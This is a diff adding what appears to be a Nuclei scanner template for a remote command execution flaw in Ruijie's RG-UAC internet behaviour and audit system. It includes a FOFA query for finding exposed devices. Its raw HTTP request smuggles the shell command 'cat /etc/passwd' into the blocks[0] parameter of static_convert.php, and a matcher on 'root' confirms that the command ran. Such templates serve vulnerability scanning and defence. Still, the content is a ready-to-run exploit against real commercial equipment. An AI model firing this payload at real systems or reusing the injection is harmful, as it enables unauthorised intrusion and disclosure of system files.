@@ -1,0 +1,29 @@
+id: ruijie-RG-UAC-static-convert-rce
+
+info:
+  name: 锐捷统一上网行为管理与审计系统naborTable命令执行
+  author: god
+  severity: critical
+  description: 锐捷统一上网行为管理与审计系统naborTable命令执行
+  metadata:
+    fofa-query: title="RG-UAC登录页面"
+  tags: ruijie,rce
+
+
+http:
+- raw:
+  - |+
+    @timeout: 30s
+    GET /view/IPV6/naborTable/static_convert.php?blocks[0]=||cat%20%2fetc%2fpasswd HTTP/1.1
+    Host: {{Hostname}}
+
+
+  max-redirects: 3
+  matchers-condition: and
+  matchers:
+    - type: word
+      part: body
+      words:
+        - root
+      condition: and
+
